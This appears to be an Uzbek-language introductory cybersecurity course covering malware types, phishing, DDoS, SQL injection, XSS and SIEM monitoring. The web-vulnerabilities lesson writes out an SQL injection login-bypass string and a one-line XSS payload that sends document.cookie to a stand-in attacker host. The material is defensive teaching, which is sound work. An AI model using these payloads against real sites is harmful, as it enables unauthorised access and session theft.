1-Dars • Zararli Dasturlar

Malware Turlari: Virus, Qurt (Worm), Troyan va Ransomware

🦠 Malware Nima?

Malware (inglizcha "malicious software" — zararli dasturiy ta'minot) — bu foydalanuvchining roziligisiz yoki xabarisiz uning kompyuteri, telefoni yoki tarmog'iga zarar yetkazish, josuslik qilish yoki boshqaruvni o'g'irlash uchun maxsus yozilgan har qanday dasturdir.

1. Kompyuter Virusi

Mavjud qonuniy fayllarga (masalan: .exe, Word hujjatlari) o'z kodini qo'shib oladi. Foydalanuvchi faylni ishga tushirganidagina faollashadi va o'zini ko'paytiradi.

2. Tarmoq Qurti (Worm)

Virusdan farqli ravishda inson harakatini talab qilmaydi! Tarmoqdagi xatoliklar va ochiq portlar orqali bir kompyuterdan boshqasiga o'zi avtomatik tarzda sakrab o'tadi.

3. Troyan Oti (Trojan)

O'zini foydali dastur, o'yin yoki drayver sifatida ko'rsatadi. O'rnatilgach, orqa fonda xaker uchun maxfiy eshik (Backdoor / RAT) ochib beradi.

4. Ransomware (Tovlamachi)

Jabrlanuvchining hujjatlarini AES-256 bilan shifrlab, kalit uchun Bitcoin yoki boshqa kriptovalyutada katta pul talab qiladi (WannaCry, LockBit).

⚠️ Tizim Zararlanganining Aniq Belgilari

  • Kompyuter kutilmaganda haddan tashqari sekin ishlay boshladi, ventilyator tinmay to'liq quvvatda aylanmoqda.
  • Fayllarning kengaytmasi o'zgarib qoldi (masalan: hujjat.docx.locked).
  • Antivirus yoki Windows Defender o'z-o'zidan o'chib qoldi va uni qayta yoqib bo'lmayapti.
  • Brauzerda soxta reklamalar va shubhali sahifalar ochilaveradi.
🛑

Ransomware Tushganda Nima Qilish Kerak?

Zudlik bilan kompyuterni tarmoqdan (Wi-Fi va LAN kabelidan) uzing! Bu zararli dasturning boshqa ofis kompyuterlariga tarqalishini to'xtatadi. Hech qachon to'lov qilmang — to'lov kalit berilishini kafolatlamaydi!

2-Dars • Ijtimoiy Muhandislik

Phishing (Fishing) va Psixologik Manipulyatsiyalar

🎣 Phishing Qanday Ishlaydi?

Phishing — bu xakerning texnik zaifliklar o'rniga inson psixologiyasidagi zaifliklardan (qo'rquv, shoshilinchlik, ochko'zlik, qiziqish) foydalanib, uning login, parol yoki bank kartasi ma'lumotlarini aldab qo'lga kiritishidir.

3-Dars • Xizmatni To'xtatish

DoS va DDoS Hujumlari Mexanizmi

💥 DoS vs DDoS Farqi

DoS (Denial of Service): Bitta hujumchi kompyuter orqali serverga uning quvvatidan ortiq so'rovlar yuborib, tizimni qulashiga olib kelish.

DDoS (Distributed Denial of Service): Dunyo bo'ylab tarqalgan yuz minglab zararlangan qurilmalar — Botnet (zombi kompyuterlar, smartfonlar va hatto zaif Wi-Fi kameralar) orqali bir vaqtning o'zida yagona nishonga trillionlab so'rovlar yo'llash.

1. Volumetric Attacks (Hajmli hujumlar)

Tarmoq o'tkazuvchanlik kanalini to'ldirib tashlash (UDP flood, NTP amplification). Ma'lumot hajmi soniyasiga Terabitlarga yetishi mumkin.

2. Protocol Attacks (Protokol hujumlari)

Server yoki tarmoq qurilmalari (firewall, load balancer) resurslarini to'ldirish (TCP SYN Flood, Ping of Death).

3. Application Layer Attacks (Amaliy pog'ona)

Eng makkor hujum (HTTP Flood / Slowloris). Serverdagi og'ir qidiruv so'rovlarini to'xtovsiz chaqirib, ma'lumotlar bazasini qotirib qo'yish.

🛡️

DDoS dan Himoyalanish Usullari

Zamonaviy bizneslar DDoS ga qarshi Cloudflare, AWS Shield yoki maxsus Anycast CDN tarmoqlaridan foydalanadi. Ular hujum trafigini global serverlar bo'ylab tarqatib yuboradi va filtrlangan toza trafikni serverga o'tkazadi.

4-Dars • Veb Zaifliklar

SQL Injection va XSS (Cross-Site Scripting) Asoslari

💉 SQL Injection (SQLi) Qanday Sodir Bo'ladi?

SQL Injection veb-dasturchining xatosi tufayli yuzaga keladi: foydalanuvchi login formasiga kiritgan ma'lumot to'g'ridan-to'g'ri ma'lumotlar bazasi so'roviga qo'shib yuboriladi.

Zaif Kod va Hujum Mexanizmi 
// Dasturchi yozgan zaif so'rov:
SELECT * FROM users WHERE username = '$user_input' AND password = '$password_input';

// Xaker username maydoniga quyidagini kiritadi:
admin' OR '1'='1

// Natijada serverda hosil bo'lgan buyruq:
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...';
// '1'='1' har doim ROST (true) bo'lgani sababli, xaker parolsiz tizimga kirib ketadi!

🛡️ To'g'ri Yechim: Parametrlashtirilgan So'rovlar (Prepared Statements)

Ma'lumotlar bazasi kiritilgan ma'lumotni hech qachon buyruq sifatida bajarmasligi, faqat oddiy matn sifatida qabul qilishi shart.

⚡ XSS (Cross-Site Scripting) Nima?

Xaker saytning izohlar bo'limiga zararli JavaScript kodini kiritadi (masalan: <script>fetch('http://hacker.com?cookie=' + document.cookie)</script>). Boshqa har bir foydalanuvchi ushbu sahifani ochganda, uning brauzerida xakerning skripti ishga tushib, foydalanuvchi sessiya ma'lumotlarini o'g'irlaydi.

5-Dars • Monitoring

Shubhali Faollikni Aniqlash va SIEM Tizimlari

👁️ SIEM (Security Information & Event Management)

Katta tashkilotlarda yuzlab serverlar, firewalllar va kompyuterlar mavjud. Har bir qurilma soniyasiga minglab log yozadi. SIEM tizimlari (Splunk, Elastic SIEM, Microsoft Sentinel) barcha loglarni yagona markazga to'playdi va sun'iy intellekt orqali shubhali korrelyatsiyalarni aniqlaydi.

IDS (Intrusion Detection System)

Tarmoq trafigini kuzatadi va kiberhujum belgilarini ko'rsa darhol administratorga ogohlantirish (alert) beradi.

IPS (Intrusion Prevention System)

Nafaqat aniqlaydi, balki hujum kelayotgan manba IP manzilini darhol avtomatik bloklab, paketlarni to'xtatadi.
